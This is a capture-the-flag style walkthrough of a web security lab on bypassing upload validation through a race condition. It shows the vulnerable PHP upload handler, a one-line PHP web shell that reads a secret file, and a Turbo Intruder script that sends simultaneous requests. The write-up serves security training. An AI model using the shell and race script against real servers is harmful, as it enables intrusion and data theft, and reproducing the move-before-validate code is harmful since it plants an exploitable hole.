# Lab: Web shell upload via race condition

## Description

 This lab contains a vulnerable image upload function. Although it performs robust validation on any files that are uploaded, it is possible to bypass this validation entirely by exploiting a race condition in the way it processes them.

To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: wiener:peter 

## Hint

 The vulnerable code that introduces this race condition is as follows: 
 
 ```php
 <?php
$target_dir = "avatars/";
$target_file = $target_dir . $_FILES["avatar"]["name"];

// temporary move
move_uploaded_file($_FILES["avatar"]["tmp_name"], $target_file);

if (checkViruses($target_file) && checkFileType($target_file)) {
    echo "The file ". htmlspecialchars( $target_file). " has been uploaded.";
} else {
    unlink($target_file);
    echo "Sorry, there was an error uploading your file.";
    http_response_code(403);
}

function checkViruses($fileName) {
    // checking for viruses
    ...
}

function checkFileType($fileName) {
    $imageFileType = strtolower(pathinfo($fileName,PATHINFO_EXTENSION));
    if($imageFileType != "jpg" && $imageFileType != "png") {
        echo "Sorry, only JPG & PNG files are allowed\n";
        return false;
    } else {
        return true;
    }
}
?>
 ```
 
 # Step 1 Source Code review
 
 Since we have access to the source code for this lab, I should review first to get an idea of what is happening. I can see that my uploaded file is first moved to a temp directory, then checked for filetype and if it has "viruses". From viewing this it may be possible to access my file from within the temp directory, before the server finishes the validation checks and deletes it.
 
 # Step 2 Upload get_secret.php and execute before validation completes
 
 
 Contents of get_secret.php
 ```php
 <?php echo file_get_contents('/home/carlos/secret'); ?>
 ```
 But when uploading it I get this error:
 
 ![image](https://user-images.githubusercontent.com/83407557/171276226-ade47fed-7433-46a8-8789-6656e4b12e28.png)

# Step 3 Create a turbo intruder attack

I send that failed post request to burp intruder and check out the [documentation](https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/default.py)

![image](https://user-images.githubusercontent.com/83407557/171276482-470dd853-4aeb-4250-b058-ee984c9ae213.png)

I take a look at the code example for race conditions

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=100,
                           pipeline=False
                           )

    # the 'gate' argument blocks the final byte of each request until openGate is invoked
    for i in range(30):
        engine.queue(target.req, target.baseInput, gate='race1')

    # wait until every 'race1' tagged request is ready
    # then send the final byte of each request
    # (this method is non-blocking, just like queue)
    engine.openGate('race1')

    engine.complete(timeout=60)


def handleResponse(req, interesting):
    table.add(req)


```
